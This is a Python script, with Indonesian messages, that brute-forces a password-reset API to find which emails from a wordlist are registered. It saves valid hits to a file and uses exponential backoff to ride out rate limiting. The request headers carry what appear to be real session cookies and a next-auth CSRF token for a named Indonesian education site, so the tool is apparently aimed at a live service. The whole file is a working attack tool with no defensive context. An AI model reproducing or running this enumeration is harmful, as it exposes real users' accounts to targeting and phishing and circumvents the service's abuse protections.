import requests
import time
from pathlib import Path
from colorama import Fore, Style

# Konfigurasi
url = "https://target/api/v1/reset-password/request"
email_list = "D:/XAMMP/htdocs/tools/email_wordlists.txt"
output_file = Path(__file__).parent / "valid_emails.txt"
headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Cookie": "_ga_YWYY60L1FX=GS1.1.1734300356.20.1.1734300404.12.0.0; _ga=GA1.1.1889359778.1731805687; _tt_enable_cookie=1; _ttp=dgmVZqr9G7Dh5iAnfGk5nckQQHb.tt.1; _gcl_au=1.1.765410170.1731889479.2054040758.1734300370.1734300409; __Host-next-auth.csrf-token=018f3e935158116f3ad46c10e732ba1e9da8126228578d7994d3c33f5795ed06%7Cf452f206500c21dc3538aa6172089e619837faaa66d83b12b68e5aa0aee3ec42; __Secure-next-auth.callback-url=https%3A%2F%2Fkampusgratis.id%2Fauth%2Flogin",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"
}

def read_file(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f]
    except FileNotFoundError:
        print(Fore.RED + f"[ERROR] File {file_path} tidak ditemukan." + Style.RESET_ALL)
        return []

def save_valid_email(email):
    try:
        with open(output_file, "a") as f:
            f.write(email + "\n")
    except Exception as e:
        print(Fore.RED + f"[ERROR] Gagal menyimpan email valid: {e}" + Style.RESET_ALL)
        
def attempt_email(email):
    data = {"email": email}
    retries = 0
    while True:
        try:
            response = requests.post(url, json=data, headers=headers)
            if response.status_code == 200:
                print(Fore.GREEN + f"[SUCCESS] Email valid: {email}" + Style.RESET_ALL)
                save_valid_email(email)
                break
            elif response.status_code == 400:
                print(Fore.YELLOW + f"[FAILED] Email invalid: {email}" + Style.RESET_ALL)
                break
            elif response.status_code == 429:
                retries += 1
                print(Fore.CYAN + f"[RETRY] Status 429 untuk email: {email}. Percobaan ke-{retries}" + Style.RESET_ALL)
                time.sleep(2 ** retries)  # Exponential backoff
            else:
                print(Fore.RED + f"[ERROR] Email: {email} | Status Code: {response.status_code}" + Style.RESET_ALL)
                break
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL)
            break

def brute_force():
    emails = read_file(email_list)

    if not emails:
        print(Fore.RED + "[ERROR] File email kosong. Pastikan file tersedia." + Style.RESET_ALL)
        return

    print(Fore.MAGENTA + "[INFO] Memulai brute force email satu per satu..." + Style.RESET_ALL)

    for email in emails:
        print(Fore.BLUE + f"[INFO] Mencoba email: {email}" + Style.RESET_ALL)
        attempt_email(email)

    print(Fore.GREEN + "[INFO] Brute force selesai. Hasil disimpan di:" + Style.RESET_ALL, output_file)

if __name__ == "__main__":
    brute_force()
